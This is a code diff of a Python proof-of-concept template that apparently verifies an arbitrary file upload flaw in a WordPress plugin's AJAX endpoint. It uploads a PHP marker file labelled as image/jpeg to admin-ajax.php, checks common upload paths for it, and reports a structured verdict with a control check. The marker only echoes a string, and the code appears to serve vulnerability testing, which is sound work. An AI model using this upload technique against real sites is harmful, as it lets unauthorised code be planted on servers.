@@ -1,10 +1,14 @@
 import io
+import hashlib
 import requests
+from wp_login import wp_login
+from poc_result import emit_result
 
 TARGET   = "{{ target_url }}"
 ACTION   = "{{ ajax_action }}"
 USERNAME = "{{ test_username }}"
 PASSWORD = "{{ test_password }}"
+ATTACKER_ROLE = "{{ attacker_role }}"
 
 # Benign marker file — its body must echo back when fetched, proving write+exec/read.
 MARKER_NAME    = "squadrone_marker.php"
@@ -12,11 +16,10 @@ MARKER_CONTENT = b"<?php echo 'WPVH_UPLOADED_OK_98271'; ?>"
 MARKER_SIGN    = "WPVH_UPLOADED_OK_98271"
 
 session = requests.Session()
-# Login (if test user exists). Subscriber login is also fine for nopriv endpoints.
-session.post(f"{TARGET}/wp-login.php", data={
-    "log": USERNAME, "pwd": PASSWORD,
-    "wp-submit": "Log In", "redirect_to": "/wp-admin/",
-}, timeout=30)
+if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
+    login = wp_login(session, TARGET, USERNAME, PASSWORD)
+    if not login.success:
+        raise RuntimeError(f"attacker login failed: {login.reason}")
 
 files_payload = {"file": (MARKER_NAME, io.BytesIO(MARKER_CONTENT), "image/jpeg")}
 data_payload  = {"action": ACTION}
@@ -25,18 +28,31 @@ resp = session.post(
     f"{TARGET}/wp-admin/admin-ajax.php",
     files=files_payload, data=data_payload, timeout=30,
 )
-print(f"[*] Upload response status={resp.status_code} body[:200]={resp.text[:200]!r}")
-
 # Try to fetch the file from common upload locations to confirm it was written.
 candidates = [
     f"{TARGET}/wp-content/uploads/{MARKER_NAME}",
     f"{TARGET}/wp-content/{MARKER_NAME}",
     f"{TARGET}/{MARKER_NAME}",
 ]
+found_url = ""
+found_hash = ""
 for url in candidates:
     r = session.get(url, timeout=15)
     if r.status_code == 200 and (MARKER_SIGN in r.text or MARKER_CONTENT in r.content):
-        print(f"[+] SUCCESS: marker fetched from {url}")
+        found_url = url
+        found_hash = hashlib.sha256(r.content).hexdigest()
         break
-else:
-    print("[!] FAILURE: marker file not retrievable from common upload paths")
+
+control_name = "squadrone_control.php"
+control_exists = any(session.get(url.replace(MARKER_NAME, control_name), timeout=15).status_code == 200 for url in candidates)
+observed = bool(found_url) and not control_exists
+emit_result(
+    verdict="vulnerable" if observed else "not_vulnerable",
+    oracle="file_effect",
+    attacker_role=ATTACKER_ROLE,
+    request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+    attack={"observed": observed, "exists": bool(found_url), "path": found_url, "marker_sha256": found_hash},
+    control={"observed": control_exists, "exists": control_exists, "path": control_name},
+    integrity="high" if observed else "none",
+    impact="The attacker uploaded a PHP-extension marker file to a web-accessible path." if observed else "No attack-only uploaded file was observed.",
+)
